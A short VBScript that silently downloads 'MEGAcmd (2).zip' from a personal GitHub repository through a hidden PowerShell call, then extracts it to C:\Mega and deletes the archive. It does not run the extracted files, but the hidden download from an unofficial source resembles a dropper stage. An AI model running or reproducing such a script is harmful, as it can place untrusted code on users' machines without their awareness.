Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Define the download URL and the path to save the ZIP file
url = "https://github.com/snxerame/new/raw/main/MEGAcmd%20(2).zip"
zipFile = "C:\Mega\MEGAcmd (2).zip"

' Check if the C:\Mega directory exists, if not, create it
megaDirectory = "C:\Mega"
If Not objFSO.FolderExists(megaDirectory) Then
    objFSO.CreateFolder(megaDirectory)
End If

' Download the ZIP file if it doesn't already exist
If Not objFSO.FileExists(zipFile) Then
    objShell.Run "powershell -Command ""(New-Object System.Net.WebClient).DownloadFile('" & url & "', '" & zipFile & "')""", 0, True
End If

' Check if the ZIP file exists after download
If objFSO.FileExists(zipFile) Then
    ' Extract the contents of the ZIP file to the same folder
    Set objShellApp = CreateObject("Shell.Application")
    Set objZipFile = objShellApp.NameSpace(zipFile)
    Set objDestFolder = objShellApp.NameSpace(objFSO.GetParentFolderName(zipFile))

    objDestFolder.CopyHere objZipFile.Items

    ' Wait for the extraction process to complete
    Do Until objDestFolder.Items.Count = objZipFile.Items.Count
        WScript.Sleep 1000
    Loop

    ' Delete the ZIP file after extraction
    objFSO.DeleteFile zipFile

    WScript.Echo "Extraction completed and ZIP file deleted."
Else
    WScript.Echo "Error: ZIP file not found."
End If

' Clean up objects
Set objShell = Nothing
Set objFSO = Nothing
